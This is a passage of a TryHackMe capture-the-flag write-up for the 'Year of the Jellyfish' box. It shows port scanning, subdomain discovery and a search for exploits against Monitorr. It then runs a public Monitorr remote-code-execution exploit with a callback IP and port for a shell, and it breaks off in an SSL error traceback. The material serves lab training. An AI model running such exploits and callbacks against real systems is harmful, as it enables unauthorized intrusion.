# Year of the Jellyfish — Writeup

## Overview
### Year of the Jellyfish — Writeup
### Year of the Jellyfish — Writeup
----
Some boxes sting...
----
![](https://assets.muirlandoracle.co.uk/thm/rooms/yotjf/jellyfish-header.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/31effaad1c9a1bccf77986649df555f0.png)
Start Machine
[**Video**](https://www.youtube.com/watch?v=g2CnIgjHeX8)
**Hack your way in. Get the Flags. Don't get stung.**
Be warned -- this box deploys with a public IP. Think about what that means for how you should approach this challenge. ISPs are often unhappy if you enumerate public IP addresses at a high speed...
_This box was part of a competition giving away an OSCP voucher and five TryHackMe subscription vouchers. The competition has now ended, and the winners can be found in the [TryHackMe Discord](https://discord.gg/tryhackme)._
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ nmap 3.249.213.107 -p- -vv
Starting Nmap 7.93 ( https://nmap.org )
Initiating Ping Scan
Scanning 3.249.213.107 [2 ports]
Completed Ping Scan (1 total hosts)
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
Initiating Connect Scan
Scanning ec2-3-249-213-107.eu-west-1.compute.amazonaws.com (3.249.213.107) [65535 ports]
Discovered open port 21/tcp on 3.249.213.107
Discovered open port 80/tcp on 3.249.213.107
Discovered open port 443/tcp on 3.249.213.107
Discovered open port 22/tcp on 3.249.213.107
Connect Scan Timing: About 3.12% done; ETC: 12:32 (0:16:04 remaining)
Increasing send delay for 3.249.213.107 from 0 to 5 due to 13 out of 41 dropped probes since last increase.
Connect Scan Timing: About 5.57% done; ETC: 12:34 (0:17:15 remaining)
Connect Scan Timing: About 6.94% done; ETC: 12:38 (0:20:20 remaining)
Increasing send delay for 3.249.213.107 from 5 to 10 due to 11 out of 31 dropped probes since last increase.
Connect Scan Timing: About 11.55% done; ETC: 12:40 (0:21:35 remaining)
Connect Scan Timing: About 19.95% done; ETC: 12:41 (0:20:19 remaining)
Connect Scan Timing: About 21.73% done; ETC: 12:44 (0:21:40 remaining)
Connect Scan Timing: About 22.77% done; ETC: 12:46 (0:23:07 remaining)
Connect Scan Timing: About 36.75% done; ETC: 12:50 (0:21:32 remaining)
Discovered open port 8000/tcp on 3.249.213.107
Connect Scan Timing: About 41.54% done; ETC: 12:50 (0:19:48 remaining)
Connect Scan Timing: About 46.48% done; ETC: 12:50 (0:18:02 remaining)
Connect Scan Timing: About 52.04% done; ETC: 12:50 (0:16:20 remaining)
Discovered open port 22222/tcp on 3.249.213.107
Connect Scan Timing: About 57.37% done; ETC: 12:50 (0:14:37 remaining)
Connect Scan Timing: About 63.08% done; ETC: 12:51 (0:12:50 remaining)
Connect Scan Timing: About 68.28% done; ETC: 12:51 (0:11:05 remaining)
Connect Scan Timing: About 73.12% done; ETC: 12:50 (0:09:18 remaining)
Connect Scan Timing: About 78.10% done; ETC: 12:50 (0:07:32 remaining)
Connect Scan Timing: About 83.12% done; ETC: 12:50 (0:05:46 remaining)
Connect Scan Timing: About 88.18% done; ETC: 12:50 (0:04:03 remaining)
Connect Scan Timing: About 93.22% done; ETC: 12:50 (0:02:19 remaining)
Connect Scan Timing: About 98.20% done; ETC: 12:50 (0:00:37 remaining)
Completed Connect Scan (65535 total ports)
Nmap scan report for ec2-3-249-213-107.eu-west-1.compute.amazonaws.com (3.249.213.107)
Host is up, received syn-ack (0.19s latency).
Not shown: 65527 filtered tcp ports (no-response), 2 filtered tcp ports (host-unreach)
PORT      STATE SERVICE    REASON
21/tcp    open  ftp        syn-ack
22/tcp    open  ssh        syn-ack
80/tcp    open  http       syn-ack
443/tcp   open  https      syn-ack
8000/tcp  open  http-alt   syn-ack
22222/tcp open  easyengine syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2043.92 seconds

https://3.249.213.107/

View certificates

 Subject Alt Names

robyns-petshop.thm
monitorr.robyns-petshop.thm
beta.robyns-petshop.thm
dev.robyns-petshop.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts 
3.249.213.107 robyns-petshop.thm dev.robyns-petshop.thm beta.robyns-petshop.thm monitorr.robyns-petshop.thm

https://beta.robyns-petshop.thm/
Under Construction
This site is under development. Please be patient.

If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. beta.robyns-petshop.thm/ID_HERE)

https://monitorr.robyns-petshop.thm/

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit monitorr                                
----------------------------------------- ---------------------------------
 Exploit Title                           |  Path
----------------------------------------- ---------------------------------
Monitorr 1.7.6m - Authorization Bypass   | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution  | php/webapps/48980.py
----------------------------------------- ------------------------

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit -m 48980   
  Exploit: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/48980
     Path: /usr/share/exploitdb/exploits/php/webapps/48980.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (434)
Copied to: /home/witty/Downloads/48980.py

┌──(witty㉿kali)-[~/Downloads]
└─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 4444
Traceback (most recent call last):
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 670, in urlopen
    httplib_response = self._make_request(
                       ^^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 381, in _make_request
    self._validate_conn(conn)
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 978, in _validate_conn
    conn.connect()
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connection.py", line 362, in connect
    self.sock = ssl_wrap_socket(
                ^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/util/ssl_.py", line 386, in ssl_wrap_socket
    return context.wrap_socket(sock, server_hostname=server_hostname)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/ssl.py", line 517, in wrap_socket
    return self.sslsocket_class._create(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/ssl.py", line 1075, in _create
    self.do_handshake()
  File "/usr/lib/python3.11/ssl.py", line 1346, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:992)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/witty/.local/lib/python3.11/site-packages/requests/adapters.py", line 439, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 726, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/util/retry.py", line 446, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:992)')))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/witty/Downloads/48980.py", line 24, in <module>
